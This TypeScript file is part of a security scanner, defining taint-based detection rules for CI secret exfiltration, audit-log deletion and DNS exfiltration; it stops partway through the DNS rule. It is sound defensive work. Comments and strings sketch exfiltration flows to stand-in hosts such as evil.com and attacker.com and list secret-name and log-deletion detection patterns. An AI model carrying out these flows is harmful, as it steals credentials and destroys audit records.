/**
 * Secret Exfiltration Flow Detector — Deep analysis for L9, K2, G7
 *
 * Traces multi-step exfiltration: secret source → encoding → network sink.
 * Uses taint analysis to find actual data flows, not pattern proximity.
 *
 * What this catches that YAML regex can't:
 * - L9: process.env.TOKEN → Buffer.from().toString('base64') → fetch(url + encoded)
 * - K2: config.auditDir → fs.unlinkSync(path) — audit trail destruction via tainted path
 * - G7: secret → dns.resolve(encoded + '.evil.com') — DNS-based exfiltration
 */

import type { TypedRule, TypedFinding } from "../base.js";
import { registerTypedRule } from "../base.js";
import type { AnalysisContext } from "../../engine.js";
import { analyzeASTTaint, type ASTTaintFlow } from "../analyzers/taint-ast.js";
import { analyzeTaint, type TaintFlow } from "../analyzers/taint.js";
import { EvidenceChainBuilder } from "../../evidence.js";
import { computeCodeSignals } from "../../confidence-signals.js";

function isTestFile(source: string): boolean {
  return /(?:__tests?__|\.(?:test|spec)\.)/.test(source);
}

function getLineNumber(source: string, index: number): number {
  return source.substring(0, index).split("\n").length;
}

// ─── L9: CI/CD Secret Exfiltration ────────────────────────────────────────

class CISecretExfilRule implements TypedRule {
  readonly id = "L9";
  readonly name = "CI/CD Secret Exfiltration (Taint-Aware)";

  analyze(context: AnalysisContext): TypedFinding[] {
    if (!context.source_code) return [];
    if (isTestFile(context.source_code)) return [];

    const findings: TypedFinding[] = [];

    // Phase 1: AST taint — find env/secret sources flowing to network/log sinks
    try {
      const astFlows = analyzeASTTaint(context.source_code);

      // Secret → network exfil
      const exfilFlows = astFlows.filter(
        (f) => f.source.category === "environment" &&
          (f.sink.category === "ssrf" || f.sink.category === "dns_exfil") &&
          !f.sanitized
      );

      for (const flow of exfilFlows) {
        const builder = new EvidenceChainBuilder()
          .source({
            source_type: "environment",
            location: `line ${flow.source.line}:${flow.source.column}`,
            observed: flow.source.expression,
            rationale:
              "Environment variable containing a secret (API key, token, password) is accessed in code. " +
              "In CI/CD environments, secrets are injected as environment variables and are high-value " +
              "targets for exfiltration — a stolen token grants access to cloud services and repositories.",
          });

        for (const step of flow.path) {
          builder.propagation({
            propagation_type: step.type === "assignment" || step.type === "destructure" ? "variable-assignment"
              : step.type === "template_embed" ? "template-literal"
              : step.type === "spread" ? "direct-pass"
              : "function-call",
            location: `line ${step.line}`,
            observed: step.expression.slice(0, 80),
          });
        }

        builder
          .sink({
            sink_type: "network-send",
            location: `line ${flow.sink.line}:${flow.sink.column}`,
            observed: flow.sink.expression.slice(0, 80),
            cve_precedent: "CVE-2025-30066",
          })
          .mitigation({
            mitigation_type: "sanitizer-function",
            present: false,
            location: `between source (L${flow.source.line}) and sink (L${flow.sink.line})`,
            detail:
              "No masking, redaction, or secret-aware sanitizer found between the env var access and the " +
              "network sink. The secret value is transmitted in its original form to the external endpoint.",
          })
          .impact({
            impact_type: "credential-theft",
            scope: "connected-services",
            exploitability: flow.path.length <= 1 ? "trivial" : "moderate",
            scenario:
              "A CI/CD pipeline secret (API key, NPM token, GitHub PAT) is read from an environment variable " +
              "and sent to an external endpoint via HTTP request or DNS query. The attacker receives the " +
              "credential and gains access to the victim's cloud services, package registries, or repositories. " +
              "CVE-2025-30066 (tj-actions) demonstrated this exact pattern at scale.",
          })
          .factor("ast_confirmed", 0.15, "AST taint analysis confirmed data flow from env var to network sink")
          .reference({
            id: "CVE-2025-30066",
            title: "tj-actions/changed-files: CI Secret Exfiltration via Workflow Logs",
            year: 2025,
            relevance:
              "CVE-2025-30066 demonstrated mass CI/CD secret exfiltration from GitHub Actions workflows. " +
              "Compromised action read secrets from environment variables and exfiltrated them via workflow logs.",
          })
          .verification({
            step_type: "trace-flow",
            instruction:
              `Trace the data flow from the environment variable at line ${flow.source.line} through ` +
              `${flow.path.length} propagation step(s) to the network sink at line ${flow.sink.line}. ` +
              `Verify that the env var contains a secret (not a non-sensitive config value like PORT or HOST). ` +
              `Check whether any encoding (base64, URL encoding) is applied before transmission.`,
            target: `source_code:${flow.source.line}-${flow.sink.line}`,
            expected_observation:
              `Secret env var ${flow.source.expression} flows to network sink without masking or redaction.`,
          })
          .verification({
            step_type: "check-config",
            instruction:
              "Check whether the CI/CD environment uses secret masking (GitHub Actions ::add-mask::, " +
              "GitLab CI/CD masked variables). Verify whether the network endpoint receiving the data is " +
              "a trusted internal service or an external/attacker-controlled URL. Examine the full URL " +
              "construction to determine if the secret is in a query parameter, header, or request body.",
            target: "CI/CD secret masking configuration and destination URL",
            expected_observation:
              "No secret masking configured — env var value is transmitted to external endpoint in cleartext.",
          });

        const chain = builder.build();

        findings.push({
          rule_id: "L9",
          severity: "critical",
          evidence:
            `[AST taint] Environment variable "${flow.source.expression}" (L${flow.source.line}) ` +
            `flows to network sink "${flow.sink.expression.slice(0, 60)}" (L${flow.sink.line}). ` +
            `${flow.path.length} propagation step(s). ` +
            `CI/CD secret exfiltration: env var data sent to external endpoint.`,
          remediation:
            "Never send environment variables (tokens, API keys) to external endpoints. " +
            "Use ::add-mask:: in GitHub Actions to prevent log exposure. " +
            "Audit all fetch/http calls in CI scripts for env var usage.",
          owasp_category: "MCP07-insecure-config",
          mitre_technique: "AML.T0057",
          confidence: flow.confidence,
          metadata: {
            analysis_type: "ast_taint",
            source_line: flow.source.line,
            sink_line: flow.sink.line,
            sink_category: flow.sink.category,
            evidence_chain: chain,
          },
        });
      }

      // Secret → log exposure
      const logFlows = astFlows.filter(
        (f) => f.source.category === "environment" &&
          f.sink.category === "xss" && // console.log/print mapped to xss in taint engine
          !f.sanitized
      );

      for (const flow of logFlows) {
        // Only flag if the logged expression contains secret-like variable names
        const hasSecretRef = /TOKEN|SECRET|KEY|PASSWORD|CREDENTIAL|AUTH|API_KEY|NPM_TOKEN/i.test(
          flow.source.expression + " " + flow.path.map((s) => s.expression).join(" ")
        );

        if (hasSecretRef) {
          const logChain = new EvidenceChainBuilder()
            .source({
              source_type: "environment",
              location: `line ${flow.source.line}`,
              observed: flow.source.expression,
              rationale:
                "A secret-bearing environment variable (TOKEN, SECRET, KEY, PASSWORD, CREDENTIAL, AUTH) " +
                "is accessed and flows to a logging function. In CI/CD pipelines, log output is stored " +
                "and often accessible to all project members or even publicly via workflow run logs.",
            })
            .sink({
              sink_type: "credential-exposure",
              location: `line ${flow.sink.line}`,
              observed: `Log output: ${flow.sink.expression.slice(0, 60)}`,
              cve_precedent: "CVE-2025-30066",
            })
            .mitigation({
              mitigation_type: "sanitizer-function",
              present: false,
              location: `between env var (L${flow.source.line}) and log (L${flow.sink.line})`,
              detail:
                "No secret masking or redaction applied before logging. CI/CD log output persists in " +
                "workflow run history and may be accessible to all repository collaborators.",
            })
            .impact({
              impact_type: "credential-theft",
              scope: "connected-services",
              exploitability: "trivial",
              scenario:
                "Secret environment variable is written to CI/CD logs (console.log, print, logger.info). " +
                "Anyone with access to the workflow run history can read the secret in cleartext. In public " +
                "repositories, this means the secret is exposed to the entire internet.",
            })
            .factor("secret_name_confirmed", 0.1, "Variable name matches known secret patterns (TOKEN, KEY, SECRET, etc.)")
            .reference({
              id: "CVE-2025-30066",
              title: "tj-actions/changed-files: Secret Exfiltration via Workflow Logs",
              year: 2025,
              relevance: "CVE-2025-30066 used workflow log exposure as the primary exfiltration channel for CI secrets.",
            })
            .verification({
              step_type: "trace-flow",
              instruction:
                `Verify that the env var "${flow.source.expression}" at line ${flow.source.line} contains ` +
                `a secret (not a non-sensitive value). Trace the flow to the log output at line ${flow.sink.line}. ` +
                `Check whether the secret value is logged directly or after transformation (base64, JSON).`,
              target: `source_code:${flow.source.line}-${flow.sink.line}`,
              expected_observation: "Secret env var value flows to log output without masking.",
            })
            .verification({
              step_type: "check-config",
              instruction:
                "Check CI/CD environment for secret masking (GitHub Actions ::add-mask::, GitLab masked variables). " +
                "Verify whether workflow logs are publicly accessible or restricted to authorized users.",
              target: "CI/CD log access controls and secret masking",
              expected_observation: "No automatic secret masking — log output persists with secret in cleartext.",
            })
            .build();

          findings.push({
            rule_id: "L9",
            severity: "high",
            evidence:
              `[AST taint] Secret env var "${flow.source.expression}" (L${flow.source.line}) ` +
              `flows to log output (L${flow.sink.line}). CI logs may expose this secret. ` +
              `CVE-2025-30066: tj-actions secret exfiltration via workflow logs.`,
            remediation:
              "Never log environment variables containing secrets. " +
              "Use ::add-mask:: in GitHub Actions. Redact before logging.",
            owasp_category: "MCP07-insecure-config",
            mitre_technique: "AML.T0057",
            confidence: flow.confidence * 0.85,
            metadata: { analysis_type: "ast_taint", source_line: flow.source.line, evidence_chain: logChain },
          });
        }
      }
    } catch {
      // Fall through to lightweight taint
    }

    // Phase 2: Lightweight taint for Python CI scripts
    if (findings.length === 0) {
      const taintFlows = analyzeTaint(context.source_code);
      const envToNetwork = taintFlows.filter(
        (f) => f.source.category === "environment" &&
          f.sink.category === "url_request" &&
          !f.sanitized
      );

      for (const flow of envToNetwork) {
        const taintChain = new EvidenceChainBuilder()
          .source({
            source_type: "environment",
            location: `line ${flow.source.line}`,
            observed: flow.source.expression,
            rationale:
              "Environment variable accessed in code. If this contains a CI/CD secret, the subsequent " +
              "network request will transmit it to an external endpoint.",
          })
          .sink({
            sink_type: "network-send",
            location: `line ${flow.sink.line}`,
            observed: flow.sink.expression.slice(0, 80),
          })
          .mitigation({
            mitigation_type: "sanitizer-function",
            present: false,
            location: `between source (L${flow.source.line}) and sink (L${flow.sink.line})`,
            detail: "No secret masking or redaction in the taint path.",
          })
          .impact({
            impact_type: "credential-theft",
            scope: "connected-services",
            exploitability: "moderate",
            scenario:
              "Environment variable data flows to a network request. If the variable contains a CI/CD " +
              "secret, the credential is exfiltrated to the request endpoint.",
          })
          .factor("taint_confirmed", 0.1, "Lightweight taint analysis confirmed env-to-network flow")
          .reference({
            id: "CVE-2025-30066",
            title: "tj-actions/changed-files CI Secret Exfiltration",
            year: 2025,
            relevance: "Same pattern: env var data flowing to network request in CI/CD context.",
          })
          .verification({
            step_type: "trace-flow",
            instruction:
              `Trace the env var at line ${flow.source.line} to the network request at line ${flow.sink.line}. ` +
              `Verify the env var contains a secret and the destination URL is not a trusted internal service.`,
            target: `source_code:${flow.source.line}-${flow.sink.line}`,
            expected_observation: "Env var data flows to external network request without redaction.",
          })
          .verification({
            step_type: "check-config",
            instruction:
              "Verify the network destination is trusted and the env var is non-sensitive, or confirm " +
              "this is a secret exfiltration risk requiring remediation.",
            target: "destination URL and env var content classification",
            expected_observation: "Secret env var transmitted to external endpoint.",
          })
          .build();

        findings.push({
          rule_id: "L9",
          severity: "critical",
          evidence:
            `[Taint] Env var "${flow.source.expression}" (L${flow.source.line}) → ` +
            `network request (L${flow.sink.line}). Secret exfiltration risk.`,
          remediation:
            "Remove network calls that reference environment secrets. " +
            "Use dedicated secret management, not env vars in HTTP requests.",
          owasp_category: "MCP07-insecure-config",
          mitre_technique: "AML.T0057",
          confidence: flow.confidence,
          metadata: { analysis_type: "taint", evidence_chain: taintChain },
        });
      }
    }

    // Phase 3: Regex fallback — bulk env dump patterns
    if (findings.length === 0) {
      const bulkDump = /(?:Object\.keys|JSON\.stringify|vars|dict)\s*\(\s*(?:process\.env|os\.environ)\s*\)/g;
      const match = bulkDump.exec(context.source_code);
      if (match) {
        const line = getLineNumber(context.source_code, match.index);
        const bulkChain = new EvidenceChainBuilder()
          .source({
            source_type: "environment",
            location: `line ${line}`,
            observed: match[0],
            rationale:
              "Code serializes the entire environment variable set (process.env or os.environ). This includes " +
              "all CI/CD secrets, API keys, tokens, and credentials — not just the specific ones the code needs.",
          })
          .sink({
            sink_type: "credential-exposure",
            location: `line ${line}`,
            observed: `Bulk env dump: ${match[0]}`,
          })
          .mitigation({
            mitigation_type: "sanitizer-function",
            present: false,
            location: `line ${line}`,
            detail:
              "No selective filtering or secret redaction before serializing all environment variables. " +
              "The entire env set (including secrets) is exposed.",
          })
          .impact({
            impact_type: "credential-theft",
            scope: "connected-services",
            exploitability: "trivial",
            scenario:
              "Serializing the entire environment (JSON.stringify(process.env), dict(os.environ)) captures " +
              "all secrets injected by CI/CD systems. If this output is logged, returned in a response, " +
              "or written to a file, all credentials are exposed simultaneously.",
          })
          .factor("regex_only", -0.1, "Regex pattern match only — taint analysis could not confirm destination")
          .reference({
            id: "CWE-532",
            title: "Insertion of Sensitive Information into Log File",
            relevance: "Bulk env dumps typically end up in logs, matching CWE-532.",
          })
          .verification({
            step_type: "inspect-source",
            instruction:
              `Review line ${line} to confirm the bulk environment serialization pattern. Trace where ` +
              `the serialized output goes — is it logged, returned in an HTTP response, or written to a file? ` +
              `Any of these destinations would expose all environment secrets.`,
            target: `source_code:${line}`,
            expected_observation: "Entire environment serialized without secret filtering.",
          })
          .verification({
            step_type: "check-config",
            instruction:
              "List the environment variables that would be captured by this bulk dump. In CI/CD " +
              "environments, check for injected secrets (GITHUB_TOKEN, NPM_TOKEN, AWS_SECRET_ACCESS_KEY). " +
              "Determine if any of these are sensitive.",
            target: "environment variables in the execution context",
            expected_observation: "Multiple secrets present in environment — bulk dump exposes all.",
          });

        const l9LineText = context.source_code.split("\n")[line - 1] || "";
        const l9Signals = computeCodeSignals({
          sourceCode: context.source_code, matchLine: line, matchText: match[0],
          lineText: l9LineText, context, owaspCategory: "MCP07-insecure-config",
        });
        for (const sig of l9Signals) { bulkChain.factor(sig.factor, sig.adjustment, sig.rationale); }
        const l9Chain = bulkChain.build();

        findings.push({
          rule_id: "L9",
          severity: "high",
          evidence:
            `[Regex fallback] Bulk environment dump at line ${line}: "${match[0]}". ` +
            `Serializing all env vars risks exposing secrets in logs or network responses.`,
          remediation: "Never serialize the entire process.env/os.environ. Select specific safe variables.",
          owasp_category: "MCP07-insecure-config",
          mitre_technique: "AML.T0057",
          confidence: l9Chain.confidence,
          metadata: { analysis_type: "regex_fallback", line, evidence_chain: l9Chain },
        });
      }
    }

    return findings;
  }
}

// ─── K2: Audit Trail Destruction ──────────────────────────────────────────

class AuditTrailDestructionRule implements TypedRule {
  readonly id = "K2";
  readonly name = "Audit Trail Destruction (Taint-Aware)";

  analyze(context: AnalysisContext): TypedFinding[] {
    if (!context.source_code) return [];
    if (isTestFile(context.source_code)) return [];

    const findings: TypedFinding[] = [];
    const source = context.source_code;

    // Phase 1: AST taint — find paths from audit/log config to file deletion sinks
    try {
      const astFlows = analyzeASTTaint(source);
      const deleteFlows = astFlows.filter(
        (f) => f.sink.category === "file_write" &&
          /unlink|rm|truncate|remove/i.test(f.sink.expression)
      );

      for (const flow of deleteFlows) {
        // Check if the path being deleted is audit/log related
        const isAuditPath = /audit|log|journal|record|trace|event/i.test(
          flow.source.expression + " " + flow.path.map((s) => s.expression).join(" ") + " " + flow.sink.expression
        );

        if (isAuditPath) {
          const k2Chain = new EvidenceChainBuilder()
            .source({
              source_type: "environment",
              location: `line ${flow.source.line}`,
              observed: flow.source.expression,
              rationale:
                "An audit/log file path is resolved from configuration or runtime state. This path points " +
                "to compliance-critical records that document system activity for regulatory auditing.",
            })
            .sink({
              sink_type: "file-write",
              location: `line ${flow.sink.line}`,
              observed: flow.sink.expression.slice(0, 80),
            })
            .mitigation({
              mitigation_type: "auth-check",
              present: false,
              location: `between path resolution (L${flow.source.line}) and deletion (L${flow.sink.line})`,
              detail:
                "No authorization check or append-only enforcement before the delete operation. Audit logs " +
                "must be protected by write-once/append-only storage to meet ISO 27001 A.8.15 requirements.",
            })
            .impact({
              impact_type: "privilege-escalation",
              scope: "server-host",
              exploitability: "moderate",
              scenario:
                "Audit trail deletion removes evidence of attacker activity. After compromising a system, " +
                "an attacker can invoke this code path to erase logs that would reveal their actions, " +
                "preventing incident response and violating regulatory record-keeping requirements " +
                "(ISO 27001 A.8.15, EU AI Act Art. 12).",
            })
            .factor("ast_confirmed", 0.15, "AST taint confirmed data flow from audit path to delete operation")
            .factor("audit_path_confirmed", 0.1, "Path expression contains audit/log/journal terminology — confirmed audit trail")
            .reference({
              id: "ISO-27001-A.8.15",
              title: "ISO 27001 Annex A.8.15 — Logging",
              relevance:
                "ISO 27001 A.8.15 requires that audit logs be protected against tampering and unauthorized " +
                "deletion. Programmatic deletion of audit files violates this control. EU AI Act Art. 12 " +
                "imposes similar record-keeping requirements for AI systems.",
            })
            .verification({
              step_type: "trace-flow",
              instruction:
                `Trace the file path from line ${flow.source.line} to the delete operation at line ${flow.sink.line}. ` +
                `Confirm the path resolves to an audit/log file (contains 'audit', 'log', 'journal', 'trace' in ` +
                `the path). Verify this is not a legitimate log rotation operation with a retention policy.`,
              target: `source_code:${flow.source.line}-${flow.sink.line}`,
              expected_observation:
                "File path resolves to audit/log file and the operation is deletion (unlink, rm, truncate) " +
                "without a corresponding archive/backup step.",
            })
            .verification({
              step_type: "check-config",
              instruction:
                "Check whether the application uses a proper log rotation mechanism (logrotate, winston " +
                "file rotation, Python RotatingFileHandler) instead of manual file deletion. Verify whether " +
                "audit logs are stored on append-only storage (S3 Object Lock, WORM storage) that prevents " +
                "programmatic deletion regardless of application code.",
              target: "log rotation configuration and storage immutability",
              expected_observation:
                "No append-only storage or log rotation configured — audit files can be deleted programmatically.",
            })
            .build();

          findings.push({
            rule_id: "K2",
            severity: "critical",
            evidence:
              `[AST taint] Audit path deletion: "${flow.source.expression}" (L${flow.source.line}) → ` +
              `delete operation "${flow.sink.expression.slice(0, 60)}" (L${flow.sink.line}). ` +
              `Audit trail destruction violates ISO 27001 A.8.15 and EU AI Act Art. 12.`,
            remediation:
              "Never delete audit/log files programmatically. Use log rotation (logrotate) with " +
              "retention policies instead. Audit logs must be append-only per compliance requirements.",
            owasp_category: "MCP09-logging-monitoring",
            mitre_technique: "AML.T0054",
            confidence: flow.confidence * 0.90,
            metadata: { analysis_type: "ast_taint", evidence_chain: k2Chain },
          });
        }
      }
    } catch {
      // Fall through
    }

    // Phase 2: Direct pattern — fs.unlink/rm on audit paths
    if (findings.length === 0) {
      const patterns = [
        { regex: /(?:unlink|unlinkSync|rm|rmSync|truncate|truncateSync)\s*\([^)]*(?:audit|log|journal)/gi, desc: "delete audit/log file" },
        { regex: /(?:unlink|unlinkSync|rm|rmSync)\s*\([^)]*(?:\.log|\.audit|\/logs\/|\/audit\/)/gi, desc: "delete .log/.audit file" },
        { regex: /(?:truncate|truncateSync)\s*\([^)]*(?:\.log|\.audit)/gi, desc: "truncate log file" },
        { regex: /os\.(?:remove|unlink)\s*\([^)]*(?:audit|log|journal)/gi, desc: "Python delete audit file" },
      ];

      for (const { regex, desc } of patterns) {
        regex.lastIndex = 0;
        const match = regex.exec(source);
        if (match) {
          const line = getLineNumber(source, match.index);
          // Exclude log rotation
          const lineText = source.split("\n")[line - 1] || "";
          if (/rotate|archive|backup|compress|gzip/i.test(lineText)) continue;

          const k2RegexChain = new EvidenceChainBuilder()
            .source({
              source_type: "file-content",
              location: `line ${line}`,
              observed: match[0].slice(0, 80),
              rationale:
                "A file deletion operation (unlink, rm, truncate) targets a path containing audit/log " +
                "identifiers. This pattern indicates programmatic destruction of audit trail records — " +
                "compliance-critical files that document system activity for regulatory auditing and " +
                "incident response.",
            })
            .sink({
              sink_type: "file-write",
              location: `line ${line}`,
              observed: `${desc}: ${match[0].slice(0, 60)}`,
            })
            .mitigation({
              mitigation_type: "auth-check",
              present: false,
              location: `line ${line}`,
              detail:
                "No authorization check, append-only enforcement, or log rotation mechanism found " +
                "around the deletion call. The audit file can be deleted unconditionally by any code " +
                "path that reaches this statement.",
            })
            .impact({
              impact_type: "privilege-escalation",
              scope: "server-host",
              exploitability: "moderate",
              scenario:
                "Programmatic audit file deletion enables evidence destruction after system compromise. " +
                "An attacker who gains code execution can invoke this path to erase logs documenting " +
                "their initial access, lateral movement, and data exfiltration — preventing forensic " +
                "investigation and violating ISO 27001 A.8.15 record-keeping requirements.",
            })
            .factor("regex_only", -0.15, "Regex pattern match only — AST taint could not trace the full data flow from path source to deletion")
            .reference({
              id: "ISO-27001-A.8.15",
              title: "ISO 27001 Annex A.8.15 — Logging",
              relevance:
                "A.8.15 requires logs to be protected from tampering and unauthorized deletion. " +
                "Programmatic deletion without authorization or append-only enforcement violates " +
                "this control. EU AI Act Art. 12 imposes equivalent record-keeping for AI systems.",
            })
            .reference({
              id: "CWE-779",
              title: "Logging of Excessive Data / Insufficient Logging",
              year: 2024,
              relevance:
                "CWE-779 covers scenarios where logging mechanisms are undermined. Audit trail " +
                "destruction is the extreme case — not insufficient logging, but active deletion " +
                "of existing log records.",
            })
            .verification({
              step_type: "inspect-source",
              instruction:
                `Review the deletion operation at line ${line}: "${match[0].slice(0, 60)}". ` +
                `Confirm the target file path contains audit/log identifiers. Check whether this ` +
                `is a legitimate log rotation operation (with a corresponding archive or retention ` +
                `step) or an unconditional deletion of audit records.`,
              target: `source_code:${line}`,
              expected_observation:
                "Audit/log file is deleted without archival — not part of a rotation mechanism.",
            })
            .verification({
              step_type: "check-config",
              instruction:
                "Verify whether the application uses proper log rotation (logrotate, winston rotation, " +
                "Python RotatingFileHandler) instead of manual deletion. Check if audit logs are on " +
                "append-only storage (S3 Object Lock, WORM) that prevents programmatic deletion.",
              target: "log rotation and storage immutability configuration",
              expected_observation:
                "No append-only enforcement — audit files can be deleted by application code.",
            });

          const k2Signals = computeCodeSignals({
            sourceCode: source, matchLine: line, matchText: match[0],
            lineText, context, owaspCategory: "MCP09-logging-monitoring",
          });
          for (const sig of k2Signals) { k2RegexChain.factor(sig.factor, sig.adjustment, sig.rationale); }
          const k2Chain = k2RegexChain.build();

          findings.push({
            rule_id: "K2",
            severity: "critical",
            evidence:
              `[Pattern] ${desc} at line ${line}: "${match[0].slice(0, 80)}". ` +
              `Audit log deletion detected. Taint analysis could not confirm path source.`,
            remediation:
              "Use log rotation instead of file deletion. Audit logs must be retained " +
              "per ISO 27001 A.8.15 and EU AI Act Art. 12.",
            owasp_category: "MCP09-logging-monitoring",
            mitre_technique: "AML.T0054",
            confidence: k2Chain.confidence,
            metadata: { analysis_type: "regex_fallback", line, evidence_chain: k2Chain },
          });
          break;
        }
      }
    }

    return findings;
  }
}

// ─── G7: DNS-Based Data Exfiltration ──────────────────────────────────────

class DNSExfiltrationRule implements TypedRule {
  readonly id = "G7";
  readonly name = "DNS-Based Data Exfiltration (Taint-Aware)";

  analyze(context: AnalysisContext): TypedFinding[] {
    if (!context.source_code) return [];
    if (isTestFile(context.source_code)) return [];

    const findings: TypedFinding[] = [];

    // Phase 1: AST taint — secret data flowing to DNS resolution
    try {
      const astFlows = analyzeASTTaint(context.source_code);
      const dnsFlows = astFlows.filter(
        (f) => f.sink.category === "dns_exfil" && !f.sanitized
      );

      for (const flow of dnsFlows) {
        const isSecretSource = /TOKEN|SECRET|KEY|PASSWORD|CREDENTIAL|AUTH|API_KEY|PRIVATE/i.test(
          flow.source.expression + " " + flow.path.map((s) => s.expression).join(" ")
        );

        const g7AstBuilder = new EvidenceChainBuilder()
          .source({
            source_type: isSecretSource ? "environment" : "file-content",
            location: `line ${flow.source.line}:${flow.source.column}`,
            observed: flow.source.expression,
            rationale:
              "Data is accessed and flows through the program to a DNS resolution call. DNS exfiltration " +
              "encodes stolen data as subdomain labels in DNS queries (e.g., `secret.attacker.com`). " +
              "Unlike HTTP exfiltration, DNS queries traverse corporate firewalls (UDP/53 is rarely blocked), " +
              "bypass DLP systems, evade SIEM monitoring, and work through air-gapped networks via DNS recursion.",
          });

        for (const step of flow.path) {
          g7AstBuilder.propagation({
            propagation_type: step.type === "assignment" || step.type === "destructure" ? "variable-assignment"
              : step.type === "template_embed" ? "template-literal"
              : step.type === "spread" ? "direct-pass"
              : "function-call",
            location: `line ${step.line}`,
            observed: step.expression.slice(0, 80),
          });
        }

        g7AstBuilder
          .sink({
            sink_type: "network-send",
            location: `line ${flow.sink.line}:${flow.sink.column}`,
            observed: flow.sink.expression.slice(0, 80),
          })
          .mitigation({
            mitigation_type: "sanitizer-function",
            present: false,
            location: `between data source (L${flow.source.line}) and DNS sink (L${flow.sink.line})`,
            detail:
              "No DNS hostname allowlist, egress filtering, or data sanitization between the data source " +
              "and the DNS resolution call. The data is encoded into a DNS query without restriction.",
          })
          .impact({
            impact_type: "data-exfiltration",
            scope: "connected-services",
            exploitability: flow.path.length <= 2 ? "trivial" : "moderate",
            scenario:
              "Sensitive data (secrets, credentials, PII) is encoded into DNS subdomain labels and " +
              "exfiltrated via DNS queries. The attacker controls the authoritative nameserver for the " +
              "target domain and reads exfiltrated data from DNS query logs. This bypasses: (1) HTTP/HTTPS " +
              "firewalls — DNS uses UDP/53, (2) DLP systems — DNS queries are not inspected for data content, " +
              "(3) SIEM monitoring — DNS traffic volume makes individual queries invisible, (4) network " +
              "segmentation — DNS recursion traverses zone boundaries.",
          })
          .factor("ast_confirmed", 0.15, "AST taint analysis confirmed data flow from source to DNS resolution sink");

        if (isSecretSource) {
          g7AstBuilder.factor("secret_source_confirmed", 0.1, "Source expression contains secret-related identifier (TOKEN, KEY, SECRET, etc.)");
        }

        g7AstBuilder
          .reference({
            id: "MITRE-ATT&CK-T1071.004",
            title: "Application Layer Protocol: DNS",
            year: 2024,
            relevance:
              "MITRE ATT&CK T1071.004 documents DNS as a command-and-control and data exfiltration channel. " +
              "Attackers encode data in DNS queries to bypass network security controls. Real-world usage " +
              "by APT groups including APT34 (OilRig) and FIN7.",
          })
          .reference({
            id: "CWE-200",
            title: "Exposure of Sensitive Information to an Unauthorized Actor",
            relevance:
              "DNS exfiltration transmits sensitive data to an attacker-controlled nameserver, " +
              "matching CWE-200's definition of unauthorized information exposure.",
          })
          .verification({
            step_type: "trace-flow",
            instruction:
              `Trace the data flow from "${flow.source.expression}" at line ${flow.source.line} through ` +
              `${flow.path.length} propagation step(s) to the DNS resolution at line ${flow.sink.line}. ` +
              `Verify: (1) what data is being exfiltrated — is it a secret, credential, or sensitive value? ` +
              `(2) how it's encoded into the DNS query — subdomain label, TXT record, or query parameter? ` +
              `(3) what domain the DNS query targets — is it an attacker-controlled domain?`,
            target: `source_code:${flow.source.line}-${flow.sink.line}`,
            expected_observation:
              `Data from ${flow.source.expression} is encoded into a DNS query hostname and resolved ` +
              `via dns.resolve() or equivalent — exfiltrating data through the DNS channel.`,
          })
          .verification({
            step_type: "check-config",
            instruction:
              "Check network egress controls: (1) Is DNS traffic filtered to allowed domains only? " +
              "(2) Is there a DNS proxy or sinkhole that blocks queries to unknown domains? " +
              "(3) Are DNS query logs monitored for high-entropy subdomain patterns (indicators of " +
              "DNS tunneling/exfiltration)? (4) Is the target domain in the query a known legitimate service?",
            target: "DNS egress filtering and monitoring configuration",
            expected_observation:
              "No DNS egress filtering — queries to arbitrary domains pass through unmonitored.",
          });

        const g7AstChain = g7AstBuilder.build();

        findings.push({
          rule_id: "G7",
          severity: "critical",
          evidence:
            `[AST taint] Data from "${flow.source.expression}" (L${flow.source.line}) ` +
            `flows to DNS resolution "${flow.sink.expression.slice(0, 60)}" (L${flow.sink.line}). ` +
            `DNS exfiltration encodes data in subdomain queries, bypassing HTTP firewalls and DLP.`,
          remediation:
            "Block DNS resolution of dynamically constructed hostnames. " +
            "Use allowlists for DNS queries. Monitor for high-entropy subdomain patterns.",
          owasp_category: "MCP04-data-exfiltration",
          mitre_technique: "AML.T0057",
          confidence: flow.confidence,
          metadata: { analysis_type: "ast_taint", evidence_chain: g7AstChain },
        });
      }
    } catch {
      // Fall through
    }

    // Phase 2: Pattern — DNS query with encoded/concatenated data
    if (findings.length === 0) {
      const patterns = [
        { regex: /dns\.resolve\s*\(\s*`[^`]*\$\{/g, desc: "DNS resolve with template literal (dynamic subdomain)" },
        { regex: /dns\.resolve\s*\([^)]*\+\s*(?!['"`])\w+/g, desc: "DNS resolve with concatenated variable" },
        { regex: /(?:nslookup|dig|host)\s+[^;\n]*\$\{/g, desc: "DNS CLI tool with variable injection" },
      ];

      for (const { regex, desc } of patterns) {
        regex.lastIndex = 0;
        const match = regex.exec(context.source_code);
        if (match) {
          const line = getLineNumber(context.source_code, match.index);

          const g7RegexChain = new EvidenceChainBuilder()
            .source({
              source_type: "file-content",
              location: `line ${line}`,
              observed: match[0].slice(0, 80),
              rationale:
                "A DNS resolution call constructs its hostname dynamically using template literals or " +
                "string concatenation with runtime variables. This is the hallmark pattern of DNS-based " +
                "data exfiltration — encoding stolen data as subdomain labels in DNS queries.",
            })
            .propagation({
              propagation_type: "template-literal",
              location: `line ${line}`,
              observed: match[0].slice(0, 80),
            })
            .sink({
              sink_type: "network-send",
              location: `line ${line}`,
              observed: `DNS resolution: ${match[0].slice(0, 60)}`,
            })
            .mitigation({
              mitigation_type: "sanitizer-function",
              present: false,
              location: `line ${line}`,
              detail:
                "No DNS hostname allowlist or egress filter before the DNS resolution call. Runtime " +
                "data is interpolated directly into the hostname without validation or restriction.",
            })
            .impact({
              impact_type: "data-exfiltration",
              scope: "connected-services",
              exploitability: "moderate",
              scenario:
                "Dynamic DNS hostname construction enables data exfiltration through the DNS channel. " +
                "Sensitive data (credentials, secrets, PII) is encoded as subdomain labels — e.g., " +
                "`<base64-secret>.attacker.com`. The attacker's authoritative nameserver captures " +
                "the data from query logs. This bypasses HTTP firewalls (DNS uses UDP/53), DLP systems " +
                "(DNS content not inspected), and SIEM monitoring (DNS volume masks individual queries).",
            })
            .factor("regex_only", -0.1, "Regex pattern match only — AST taint could not confirm the full data flow origin")
            .reference({
              id: "MITRE-ATT&CK-T1071.004",
              title: "Application Layer Protocol: DNS",
              year: 2024,
              relevance:
                "DNS as exfiltration channel — documented in MITRE ATT&CK T1071.004. Used by APT34, " +
                "FIN7, and commodity malware. Dynamic hostname construction is the key indicator.",
            })
            .verification({
              step_type: "inspect-source",
              instruction:
                `Review the DNS resolution call at line ${line}: "${match[0].slice(0, 60)}". ` +
                `Identify what runtime variable is interpolated into the hostname. Trace backward ` +
                `to determine: (1) what data the variable contains — is it a secret, credential, or ` +
